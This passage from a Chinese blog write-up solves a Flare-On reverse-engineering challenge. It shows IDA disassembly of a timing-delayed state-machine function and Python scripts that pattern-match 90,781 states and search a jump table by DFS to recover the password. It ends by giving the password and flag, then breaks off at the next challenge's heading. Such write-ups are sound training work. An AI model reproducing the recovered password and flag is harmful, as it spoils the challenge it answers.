class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> sub_140860241 proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> lpDirectory= <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> nShowCmd= <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_28= <span class="built_in">byte</span> <span class="built_in">ptr</span>  <span class="number">30h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_3BB84= <span class="built_in">byte</span> <span class="built_in">ptr</span>  <span class="number">3BB8Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_58AB0= <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">58AB8h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_58D10= <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">58D18h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_58D18= <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">58D20h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> arg_58D28= <span class="built_in">qword</span> <span class="built_in">ptr</span>  <span class="number">58D30h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860241</span> <span class="keyword">rdtsc</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860243</span> <span class="keyword">shl</span>     <span class="built_in">rdx</span>, <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860247</span> <span class="keyword">or</span>      <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086024A <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58D10], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860252</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860252</span> loc_140860252:                          <span class="comment">; CODE XREF: sub_140860241+3E↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860252</span> <span class="keyword">rdtsc</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860254</span> <span class="keyword">shl</span>     <span class="built_in">rdx</span>, <span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860258</span> <span class="keyword">or</span>      <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086025B <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58D18], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860263</span> <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rsp</span>+arg_58D10]</span><br><span class="line"><span class="symbol">.text:</span>000000014086026B <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsp</span>+arg_58D18]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860273</span> <span class="keyword">sub</span>     <span class="built_in">rcx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860276</span> <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860279</span> <span class="keyword">cmp</span>     <span class="built_in">rax</span>, <span class="number">12AD1659h</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086027F <span class="keyword">jl</span>      short loc_140860252</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860281</span> <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">rsp</span>+arg_28]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860286</span> <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_3BB84], <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000014086028D</span> <span class="keyword">cmp</span>     [<span class="built_in">rsp</span>+arg_3BB84], <span class="number">4Ah</span> <span class="comment">; &#x27;J&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860295</span> <span class="keyword">jz</span>      short loc_1408602CE</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860297</span> <span class="keyword">cmp</span>     [<span class="built_in">rsp</span>+arg_3BB84], <span class="number">55h</span> <span class="comment">; &#x27;U&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086029F <span class="keyword">jz</span>      short loc_1408602EF</span><br><span class="line"><span class="symbol">.text:</span>00000001408602A1 <span class="keyword">cmp</span>     [<span class="built_in">rsp</span>+arg_3BB84], <span class="number">69h</span> <span class="comment">; &#x27;i&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602A9 <span class="keyword">jz</span>      short loc_1408602AD</span><br><span class="line"><span class="symbol">.text:</span>00000001408602AB <span class="keyword">jmp</span>     short loc_140860310</span><br><span class="line"><span class="symbol">.text:</span>00000001408602AD <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602AD</span><br><span class="line"><span class="symbol">.text:</span>00000001408602AD loc_1408602AD:                          <span class="comment">; CODE XREF: sub_140860241+68↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602AD <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58D28], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602B9 <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rsp</span>+arg_58AB0]</span><br><span class="line"><span class="symbol">.text:</span>00000001408602C1 <span class="keyword">inc</span>     <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602C4 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58AB0], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602CC <span class="keyword">jmp</span>     short loc_14086033F</span><br><span class="line"><span class="symbol">.text:</span>00000001408602CE <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602CE</span><br><span class="line"><span class="symbol">.text:</span>00000001408602CE loc_1408602CE:                          <span class="comment">; CODE XREF: sub_140860241+54↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602CE <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58D28], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602DA <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rsp</span>+arg_58AB0]</span><br><span class="line"><span class="symbol">.text:</span>00000001408602E2 <span class="keyword">inc</span>     <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602E5 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58AB0], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602ED <span class="keyword">jmp</span>     short loc_14086033F</span><br><span class="line"><span class="symbol">.text:</span>00000001408602EF <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602EF</span><br><span class="line"><span class="symbol">.text:</span>00000001408602EF loc_1408602EF:                          <span class="comment">; CODE XREF: sub_140860241+5E↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602EF <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58D28], <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>00000001408602FB <span class="keyword">mov</span>     <span class="built_in">rax</span>, [<span class="built_in">rsp</span>+arg_58AB0]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860303</span> <span class="keyword">inc</span>     <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860306</span> <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+arg_58AB0], <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086030E <span class="keyword">jmp</span>     short loc_14086033F</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860310</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860310</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860310</span> loc_140860310:                          <span class="comment">; CODE XREF: sub_140860241+6A↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860310</span> <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+nShowCmd], <span class="number">5</span>               <span class="comment">; nShowCmd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860318</span> <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+lpDirectory], <span class="number">0</span>            <span class="comment">; lpDirectory</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860321</span> <span class="keyword">lea</span>     <span class="built_in">r9</span>, Parameters                  <span class="comment">; &quot; /c msg * Hello there, Hacker&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860328</span> <span class="keyword">lea</span>     <span class="built_in">r8</span>, File                        <span class="comment">; &quot;cmd.exe&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086032F <span class="keyword">lea</span>     <span class="built_in">rdx</span>, Operation                  <span class="comment">; &quot;open&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860336</span> <span class="keyword">xor</span>     <span class="built_in">ecx</span>, <span class="built_in">ecx</span>                        <span class="comment">; hwnd</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000140860338</span> <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_ShellExecuteA</span><br><span class="line"><span class="symbol">.text:</span>000000014086033E <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086033F</span><br><span class="line"><span class="symbol">.text:</span>000000014086033F loc_14086033F:                          <span class="comment">; CODE XREF: sub_140860241+8B↑j</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086033F                                         <span class="comment">; sub_140860241+AC↑j ...</span></span><br><span class="line"><span class="symbol">.text:</span>000000014086033F <span class="keyword">jmp</span>     control_flow_distributor</span><br><span class="line"><span class="symbol">.text:</span>000000014086033F sub_140860241 endp</span><br></pre></td></tr></table></figure>

<p>比较第一个字节是J、U、i中的一个，根据其不同向跳转表指针状态位+2、3、1，否则弹窗，之后返回到控制流分发函数，保存上一个函数中的状态值，并跳转到下一个函数，之后所有的函数都是这个形式，因此编写规则匹配：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">file_path</span>):</span><br><span class="line">    rdtsc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0F3148C1E220480BC2&quot;</span>)</span><br><span class="line">    compare = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;482BC8488BC1483D5916AD127CD1&quot;</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">        re.escape(rdtsc)+<span class="string">b&#x27;.&#123;8&#125;&#x27;</span>+re.escape(rdtsc)+<span class="string">b&#x27;.&#123;24&#125;&#x27;</span>+re.escape(compare),</span><br><span class="line">        re.DOTALL)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    matches = pattern.findall(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(matches)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;File&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    file_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    count = find(file_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;count&#125;</span> matches.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>刚好匹配到全部90781个函数，提取其后的比较和增加量：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signed_byte</span>(<span class="params">b</span>): <span class="keyword">return</span> b - <span class="number">256</span> <span class="keyword">if</span> b &gt;= <span class="number">128</span> <span class="keyword">else</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_and_extract</span>(<span class="params">file_path</span>):</span><br><span class="line">    rdtsc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0F3148C1E220480BC2&quot;</span>)</span><br><span class="line">    compare = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;482BC8488BC1483D5916AD127CD1&quot;</span>)</span><br><span class="line">    base_pattern = re.escape(rdtsc) + <span class="string">b&#x27;.&#123;8&#125;&#x27;</span> + re.escape(rdtsc) + <span class="string">b&#x27;.&#123;24&#125;&#x27;</span> + re.escape(compare)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(base_pattern, re.DOTALL)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: data = f.read()</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> pattern.finditer(data):</span><br><span class="line">        start_offset = <span class="keyword">match</span>.start()</span><br><span class="line">        base_end = <span class="keyword">match</span>.end()</span><br><span class="line">        pos = base_end + <span class="number">12</span></span><br><span class="line">        <span class="keyword">if</span> data[pos] != <span class="number">0x80</span>:</span><br><span class="line">            new_offset = start_offset + <span class="number">0xC00</span></span><br><span class="line">            results.append(<span class="string">f&quot;0x<span class="subst">&#123;new_offset:X&#125;</span>\tEOF&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        output_parts = [<span class="string">f&quot;0x<span class="subst">&#123;(start_offset + <span class="number">0xC00</span>):X&#125;</span>&quot;</span>]</span><br><span class="line">        current_pos = pos</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmp_val = data[current_pos + <span class="number">7</span>]</span><br><span class="line">            jz_addr = current_pos + <span class="number">8</span></span><br><span class="line">            jz_disp = data[jz_addr + <span class="number">1</span>]</span><br><span class="line">            target_addr = jz_addr + <span class="number">1</span> + signed_byte(jz_disp)</span><br><span class="line">            mov_val_addr = target_addr + <span class="number">9</span></span><br><span class="line">            dword_bytes = data[mov_val_addr : mov_val_addr + <span class="number">4</span>]</span><br><span class="line">            dword_val = <span class="built_in">int</span>.from_bytes(dword_bytes, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            output_parts.append(<span class="string">f&quot;0x<span class="subst">&#123;cmp_val:02X&#125;</span>&quot;</span>)</span><br><span class="line">            output_parts.append(<span class="string">f&quot;0x<span class="subst">&#123;dword_val:08X&#125;</span>&quot;</span>)</span><br><span class="line">            next_pos = current_pos + <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> data[next_pos] != <span class="number">0x80</span>:</span><br><span class="line">                output_parts.append(<span class="string">&quot;EOF&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            current_pos = next_pos</span><br><span class="line">        results.append(<span class="string">&quot;\t&quot;</span>.join(output_parts))</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;File&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    file_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    results = find_and_extract(file_path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out_file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> results:</span><br><span class="line">            out_file.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Write to out.txt (Total <span class="subst">&#123;<span class="built_in">len</span>(results)&#125;</span> cases)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>用输出的out.txt和jmptable进行dfs：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_jmptable</span>(<span class="params">jmptable_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(jmptable_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f: data = f.read()</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) == <span class="number">90781</span> * <span class="number">4</span>, <span class="string">f&quot;jmptable size error: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span> bytes&quot;</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">90781</span>):</span><br><span class="line">        dword = <span class="built_in">int</span>.from_bytes(data[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        table.append(dword)</span><br><span class="line">    <span class="keyword">return</span> table</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_out_txt</span>(<span class="params">out_path</span>):</span><br><span class="line">    state_map = &#123;&#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts <span class="keyword">or</span> parts[<span class="number">0</span>] == <span class="string">&#x27;&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">            state_key = <span class="built_in">int</span>(parts[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">            transitions = []</span><br><span class="line">            i = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(parts) <span class="keyword">and</span> parts[i] != <span class="string">&#x27;EOF&#x27;</span>:</span><br><span class="line">                char_str = parts[i]</span><br><span class="line">                next_str = parts[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> char_str == <span class="string">&#x27;EOF&#x27;</span> <span class="keyword">or</span> next_str == <span class="string">&#x27;EOF&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">                char_byte = <span class="built_in">int</span>(char_str, <span class="number">16</span>)</span><br><span class="line">                next_index = <span class="built_in">int</span>(next_str, <span class="number">16</span>)</span><br><span class="line">                transitions.append((char_byte, next_index))</span><br><span class="line">                i += <span class="number">2</span></span><br><span class="line">            state_map[state_key] = transitions</span><br><span class="line">    <span class="keyword">return</span> state_map</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_to_char</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span>: <span class="keyword">return</span> <span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="string">f&quot;\\x<span class="subst">&#123;b:02X&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">current_key, jmptable, state_map, path, visited, all_paths</span>):</span><br><span class="line">    transitions = state_map[current_key]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> transitions:</span><br><span class="line">        all_paths.append(<span class="string">&#x27;&#x27;</span>.join(path))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    visited.add(current_key)</span><br><span class="line">    <span class="keyword">for</span> char_byte, next_index <span class="keyword">in</span> transitions:</span><br><span class="line">        next_key = jmptable[next_index]</span><br><span class="line">        new_path = path + [byte_to_char(char_byte)]</span><br><span class="line">        dfs(next_key, jmptable, state_map, new_path, visited, all_paths)</span><br><span class="line">    visited.remove(current_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python dfs_search.py &lt;jmptable_file&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    jmptable_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    out_path = <span class="string">&quot;out.txt&quot;</span></span><br><span class="line">    output_path = <span class="string">&quot;cases.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Reading jmptable...&quot;</span>)</span><br><span class="line">    jmptable = read_jmptable(jmptable_path)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Parsing out.txt...&quot;</span>)</span><br><span class="line">    state_map = parse_out_txt(out_path)</span><br><span class="line"></span><br><span class="line">    start_key = <span class="number">0x860241</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start_key <span class="keyword">not</span> <span class="keyword">in</span> state_map:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Start key 0x<span class="subst">&#123;start_key:X&#125;</span> not found in out.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    all_paths = []</span><br><span class="line">    dfs(start_key, jmptable, state_map, [], <span class="built_in">set</span>(), all_paths)</span><br><span class="line">    max_len = <span class="built_in">max</span>(<span class="built_in">len</span>(p) <span class="keyword">for</span> p <span class="keyword">in</span> all_paths)</span><br><span class="line">    longest_paths = [p <span class="keyword">for</span> p <span class="keyword">in</span> all_paths <span class="keyword">if</span> <span class="built_in">len</span>(p) == max_len]</span><br><span class="line">    longest_paths = <span class="built_in">sorted</span>(<span class="built_in">set</span>(longest_paths))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;<span class="built_in">len</span>(longest_paths)&#125;</span> longest path(s) of length <span class="subst">&#123;max_len&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> longest_paths: f.write(path + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Longest paths written to <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>得到唯一解：<font color=red><strong>iqg0nSeCHnOMPm2Q</strong></font></p>
<p><font color=deepskyblue><strong><a href="mailto:&#102;&#49;&#x6e;&#x31;&#x74;&#x33;&#95;&#115;&#116;&#x34;&#116;&#51;&#95;&#109;&#52;&#99;&#x68;&#x31;&#110;&#x33;&#x73;&#x5f;&#52;&#114;&#51;&#x5f;&#x66;&#x75;&#x6e;&#64;&#x66;&#108;&#x61;&#114;&#x65;&#x2d;&#111;&#110;&#46;&#x63;&#111;&#x6d;">f1n1t3_st4t3_m4ch1n3s_4r3_fun@flare-on.com</a></strong></font></p>
<h1 id="6-Chain-of-Demands"><a href="#6-Chain-of-Demands" class="headerlink" title="#6 Chain of Demands"></a>#6 Chain of Demands</h1><p>发现是pyinstaller打包的elf文件，提取并反编译：</p>
